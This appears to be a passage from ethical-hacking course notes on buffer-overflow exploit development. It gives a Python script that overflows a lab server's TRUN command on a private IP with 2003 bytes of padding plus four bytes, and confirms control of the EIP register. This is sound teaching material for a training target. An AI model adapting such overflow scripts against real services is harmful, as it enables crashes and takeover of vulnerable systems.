# Overwritting the EIP 

We previously found that the offset was at 2003 bytes 

I.e. there are 2003 bytes before you get to the EIP and the EIP itself is 4 bytes long

Change our last script `2.py` to `3.py` to check if we can overwrite the EIP:

```
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.0.2.15',9999))
		s.send(('TRUN /.:/' + shellcode ))
		s.close()
	except:
		print "Error connecting to server"
		sys.exit()
```

![](https://github.com/Cyberd0xed/practical-ethical-hacking/blob/main/resources/0c85d5c234ef418981e982d9dfb083ce.png?raw=true)

Indeed able to control the EIP, which became "B" (42424242)
